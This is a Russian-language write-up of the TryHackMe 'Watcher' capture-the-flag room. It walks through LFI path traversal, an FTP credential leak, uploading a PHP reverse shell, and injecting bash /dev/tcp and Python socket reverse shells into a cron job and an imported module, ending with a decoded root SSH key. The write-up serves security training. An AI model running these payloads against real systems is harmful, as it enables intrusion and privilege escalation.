## Watcher
- https://tryhackme.com/room/watcher
## FLAG 1
Сканируем сеть
nmap -sC -sV
- Стандартные скрипты
- сканирование версий
```
└─$ nmap -sC -sV 10.80.129.112
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 15:14 +0300
Nmap scan report for 10.80.129.112
Host is up (0.079s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:7c:e9:1b:ee:fa:0b:90:15:aa:2d:90:25:6f:c2:0b (RSA)
|   256 c0:cb:f2:fc:27:bd:10:eb:d1:12:e7:09:b2:f7:30:74 (ECDSA)
|_  256 99:47:72:91:c1:9a:48:56:fe:16:c2:a0:47:98:1e:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Jekyll v4.1.1
|_http-title: Corkplacemats
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.95 seconds
```

Смотрим 80 порт:
<img width="1470" height="722" alt="Pasted image 20260128151914" src="https://github.com/user-attachments/assets/56f23484-4091-4c09-b74f-b5dda19d22ea" />


Cмотрим директорию /robots.txt
```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```
Переходим на /flag_1.txt и читаем первый флаг:

## FALG 2
/secret_file_do_not_read.txt пишет Forbidden 
<img width="1253" height="695" alt="Pasted image 20260128152217" src="https://github.com/user-attachments/assets/621993b6-f5f6-4756-9931-77bfedc51b50" />

Посмотрим что еще есть на сайте
<img width="1264" height="684" alt="Pasted image 20260128152345" src="https://github.com/user-attachments/assets/e37b0c55-3b91-43f7-a714-01e9109d6a60" />

Видим в URL, что параметр post.php?=post передает имя файла, может получится сделать LFI
>**Уязвимость LFI (Local File Inclusion — локальное включение файлов) возникает, когда веб-приложение допускает включение локальных файлов на сервере в своем коде без достаточной проверки или аутентификации. Основной принцип работы уязвимости LFI заключается в том, что злоумышленник может эксплуатировать эту уязвимость, чтобы получить доступ к локальным файлам на сервере и выполнить различные атаки.**

Пробуем прочитать /etc/passwd таким образом
```
http://10.80.129.112/post.php?post=../../../../etc/passwd
```
И это работает! Мы вышли за пределы веб-сервера и смогли прочитать файлы на локальной машине!
Пробуем прочитать тот самый файл secret_file_do_not_read.txt
```
http://10.80.129.112/post.php?post=secret_file_do_not_read.txt
```

В ответ получаем следующее сообщение с кредами от ftp и директорию где хранятся файлы /home/ftpuser/ftp/files
```
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- 
ftpuser:[REDACTED]
```

Подключаемся по FTP с полученными кредами
```
└─$ ftp 10.80.129.112
Connected to 10.80.129.112.
220 (vsFTPd 3.0.5)
Name (10.80.129.112:parallels): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||47743|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
226 Directory send OK.
ftp> get flag_2.txt 
local: flag_2.txt remote: flag_2.txt
229 Entering Extended Passive Mode (|||47065|)
150 Opening BINARY mode data connection for flag_2.txt (21 bytes).
100% |**********************************************|    21       14.83 KiB/s    00:00 ETA
226 Transfer complete.
21 bytes received in 00:00 (0.25 KiB/s)
```

Скачиваем второй флаг и читаем
```
└─$ cat flag_2.txt
[REDACTED]
```
## FLAG 3
Думаю самое время получить реверс шелл
> Reverse shell — это тип сетевого соединения, при котором устройство-жертва устанавливает обратное соединение с атакующим устройством. Это позволяет злоумышленнику получить доступ к командной строке устройства-жертвы и управлять им удаленно.

- https://github.com/pentestmonkey/php-reverse-shell тут я взял php команду для шелла
Сохраняем себе на комп и в коде поменяем порт и ip-дрес на ip выданный TryHackMe, его можно посмотреть командой ip a

Загружаем скрипт на машинну 
```
ftp> cd files
250 Directory successfully changed.
ftp> send php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||41054|)
150 Ok to send data.
100% |**********************************************|  5495       17.12 MiB/s    00:00 ETA
226 Transfer complete.
5495 bytes sent in 00:00 (34.23 KiB/s)
```

открываем у себя порт
```
└─$ nc -lvnp 4444             
listening on [any] 4444 ...
```

И переходим по ссылке
http://10.80.129.112/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php

И получаем шелл в терминале где открыли порт

Улучшаем наш шелл командой 
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Через find находим 3 флаг
```
www-data@ip-10-80-129-112:/$ find / -type f -name flag_3.txt 2>/dev/null
find / -type f -name flag_3.txt 2>/dev/null
/var/www/html/more_secrets_a9f10a/flag_3.txt
www-data@ip-10-80-129-112:/$ cat /var/www/html/more_secrets_a9f10a/flag_3.txt
cat /var/www/html/more_secrets_a9f10a/flag_3.txt
FLAG{REDACTED}
```

## FLAG 4
Смотрим что умеем
```
www-data@ip-10-80-129-112:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on ip-10-80-129-112:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-80-129-112:
    (toby) NOPASSWD: ALL
```

Мы спокойно можем повысить свои права до пользователя toby:
```
www-data@ip-10-80-129-112:/$ sudo -iu toby
sudo -iu toby
toby@ip-10-80-129-112:~$ cd /home/toby 
cd /home/toby
toby@ip-10-80-129-112:~$ ls
ls
flag_4.txt  jobs  note.txt
toby@ip-10-80-129-112:~$ cat flag_4.txt
```
И читаем 4 флаг

## FLAG 5
Смотрим note.txt
```
toby@ip-10-80-129-112:~$ cat note.txt
cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```
Есть крон таблица, посмотрим что там происходит

```
toby@ip-10-80-129-112:~$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
```
Видим что от имени mat выполняется файл /home/toby/jobs/cow.sh с определенной периодичностью

Закидываем простой баш скрипт для реверс шелла в выполняемый файл
```
toby@ip-10-80-129-112:~/jobs$ echo '/bin/bash -i >& /dev/tcp/192.168.155.3/5555 0>&1' >> cow.sh
<h -i >& /dev/tcp/192.168.155.3/5555 0>&1' >> cow.sh
```

```
toby@ip-10-80-129-112:~/jobs$ cat cow.sh
cat cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
/bin/bash -i >& /dev/tcp/192.168.155.3/5555 0>&1
```

Открываем соответсвующий порт и просто ждем пока команда сработает
```
└─$ nc -lvnp 5555
listening on [any] 5555 ...
```

Отлично! Шелл пользователя mat!

```
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.155.3] from (UNKNOWN) [10.80.129.112] 46410
bash: cannot set terminal process group (3345): Inappropriate ioctl for device
bash: no job control in this shell
mat@ip-10-80-129-112:~$ ^[[B^[[B^[[Bpython3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
mat@ip-10-80-129-112:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
mat@ip-10-80-129-112:~$ ls
ls
cow.jpg  flag_5.txt  note.txt  scripts
mat@ip-10-80-129-112:~$ cat flag_5.txt
cat flag_5.txt
FLAG{REDACTED}
```

## FLAG 6
Смотрим что умеет mat
```
mat@ip-10-80-129-112:~$ sudo -l
sudo -l
Matching Defaults entries for mat on ip-10-80-129-112:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on ip-10-80-129-112:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
mat@ip-10-80-129-112:~$ cat /home/mat/scripts/will_script.py
```

Есть некий скрипт на python 
```python
cat /home/mat/scripts/will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
```

```
mat@ip-10-80-129-112:~$ cd scripts
```

Закидываем туда реверс шелл команду меняя свой ip и порт
```
mat@ip-10-80-129-112:~/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.155.3",1236));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' >> cmd.py
<);p=subprocess.call(["/bin/bash","-i"]);' >> cmd.py
```

И запускаем
```
mat@ip-10-80-129-112:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
</usr/bin/python3 /home/mat/scripts/will_script.py 1
```

И мы опять получили шелл
```
will@ip-10-80-129-112:/home/mat/scripts$ cd /home/will
cd /home/will
will@ip-10-80-129-112:~$ ls
ls
flag_6.txt
will@ip-10-80-129-112:~$ cat flag_6.txt
cat flag_6.txt
FLAG{REDACTED}
```

## FLAG 7

Посмотреть что умеем не получается, поэтому полазив по системе в /opt/backups я нашел закодированный ssh ключ от рут пользователя
```
will@ip-10-80-129-112:~$ sudo -l
sudo -l
[sudo] password for will:


will@ip-10-80-129-112:~$ 
find / -group adm 2>/dev/null

will@ip-10-80-129-112:~$ find / -group adm 2>/dev/null
/opt/backups
/opt/backups/key.b64
/var/log/dmesg.3.gz
/var/log/auth.log
/var/log/kern.log
/var/log/kern.log.2.gz
/var/log/syslog.2.gz
/var/log/vsftpd.log
/var/log/dmesg.0
/var/log/dmesg
/var/log/syslog
/var/log/auth.log.1
/var/log/cloud-init-output.log
/var/log/apache2
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache2/error.log.2.gz
/var/log/apache2/error.log.1
/var/log/apache2/other_vhosts_access.log
/var/log/apache2/access.log.1
/var/log/dmesg.4.gz
/var/log/dmesg.1.gz
/var/log/cloud-init.log
/var/log/kern.log.1
/var/log/auth.log.2.gz
/var/log/dist-upgrade/apt-term.log
/var/log/unattended-upgrades
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log.1.gz
/var/log/dmesg.2.gz
/var/log/syslog.1
/var/log/apt/term.log.2.gz
/var/log/apt/term.log
/var/log/apt/term.log.1.gz
/var/spool/rsyslog
```


```
will@ip-10-80-129-112:~$ cat /opt/backups/key.b64
cat /opt/backups/key.b64
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
...
bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=

```

Декодируем и копируем ключ к себе на машину
```
will@ip-10-80-129-112:~$ cat /opt/backups/key.b64 | base64 -d
cat /opt/backups/key.b64 | base64 -d
-----BEGIN RSA PRIVATE KEY-----
... Тут лежит ключ
-----END RSA PRIVATE KEY-----
```

Выдаем права ключу
```
└─$ chmod 400 id_rsa
```

И подключаемся от имени рут
```
└─$ ssh -i id_rsa root@10.80.129.112
```

И читаем наш флаг 7
```
root@ip-10-80-129-112:~# cd /root
root@ip-10-80-129-112:~# ls
flag_7.txt  snap
root@ip-10-80-129-112:~# cat flag_7.txt
```
